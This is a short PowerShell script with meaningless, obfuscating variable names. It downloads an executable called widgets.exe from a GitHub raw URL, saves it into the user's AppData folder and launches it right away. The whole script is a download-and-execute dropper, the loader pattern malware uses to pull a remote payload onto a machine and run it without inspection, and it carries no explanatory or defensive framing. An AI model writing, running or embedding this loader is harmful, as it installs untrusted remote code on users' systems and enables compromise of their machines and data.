$gfgff = @(
    "https://github.com/Pederasta/testic/raw/refs/heads/main/widgets.exe"
)
$dfsgsfdg = [Environment]::GetFolderPath('ApplicationData')

foreach ($link in $gfgff) {
    $dgfsgfd = Split-Path -Leaf $link
    $sgdf = Join-Path -Path $dfsgsfdg -ChildPath $dgfsgfd
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($link, $sgdf)
    Start-Process -FilePath $sgdf
}
